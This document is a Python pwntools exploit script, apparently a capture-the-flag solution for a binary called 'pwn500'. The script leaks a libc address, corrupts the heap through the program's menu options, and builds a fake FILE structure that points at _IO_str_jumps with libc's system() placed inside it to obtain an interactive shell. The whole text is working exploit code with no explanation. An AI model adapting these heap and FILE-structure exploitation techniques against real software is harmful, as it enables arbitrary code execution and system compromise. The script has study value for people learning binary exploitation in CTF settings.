#/usr/bin/env python 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './pwn500'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
pause()

def Meyer():
    io.recvuntil('Pls input your choice:\n')
    io.sendline(str(2))

def Meyer_add():
    io.recvuntil('Pls Input your choice:')
    io.sendline(str(2))

def Meyer_remove():
    io.recvuntil('Pls Input your choice:\n')
    io.sendline(str(3))

def Meyer_edit(Content):
    io.recvuntil('Pls Input your choice:\n')
    io.sendline(str(4))
    io.recvuntil('Get Input:\n')
    io.send(Content)

def Meyer_exit():
    io.recvuntil('Pls Input your choice:\n')
    io.sendline(str(5))

def advise():
    io.recvuntil('Pls input your choice:\n')
    io.sendline(str(3))

def advise_leave(Size):
    io.recvuntil("4.return\n")
    io.sendline(str(1))
    io.recvuntil('Input size(200~8000):\n')
    io.sendline(str(Size))

def advise_edit(Content):
    io.recvuntil("4.return\n")
    io.sendline(str(2))
    io.recvuntil('Input your advise\n')
    io.sendline(Content)

def advise_delete():
    io.recvuntil("4.return\n")
    io.sendline(str(3))

def advise_exit():
    io.recvuntil("4.return\n")
    io.sendline(str(4))

def submit(Num,Addr):
    io.recvuntil('Pls input your choice:\n')
    io.sendline(str(4))
    io.recvuntil('input your phone number first:\n')
    io.send(Num)
    io.recvuntil('input your home address\n')
    io.send(Addr)

Meyer()
Meyer_add()
Meyer_exit()
submit('a\n', 'a' * 40 + '\n')
io.recvuntil("a" * 40)
libc_addr = u64(io.recvn(6).ljust(8, '\x00')) - 0x7f6762b1be90 + 0x00007f6762ae5000
libc.address = libc_addr
print hex(libc_addr)

advise()
advise_leave(6064 + 16 + 16) 
advise_exit()

Meyer()
Meyer_edit('a' * 0x10 + p64(libc_addr + 0x3c67f8 - 0x10) * 2)
Meyer_remove()
Meyer_exit()
pause()

advise()
payload = (p64(libc_addr + 0x3c56a3) * 3 + 
        p64(libc_addr + 0x3c56a3 + (libc_addr + 0x11e70 - 100) / 2) + 
        p64(libc_addr + 0x3c56a3) * 2 + 
        p64(libc_addr + 0x3c56a3 + (libc_addr + 0x11e70 - 100) / 2) + 
        p64(0) * 5 + 
        p64(1) + 
        p64(0xffffffffffffffff) + 
        p64(0x0) + 
        p64(libc_addr + 0x3c6780) + 
        p64(0xffffffffffffffff) + 
        p64(0) + 
        p64(libc_addr + 0x3c47a0) + 
        p64(0) * 3 + 
        p64(0x00000000ffffffff) + 
        p64(0) * 2 + 
        p64(libc_addr + 0x3c37a0)) # _IO_str_jumps
payload = payload.ljust(0xd0, '\x00')
payload += p64(libc.symbols['system'])
advise_edit(payload)

#advise_edit('a' * 2000)
advise_delete() 

io.interactive()

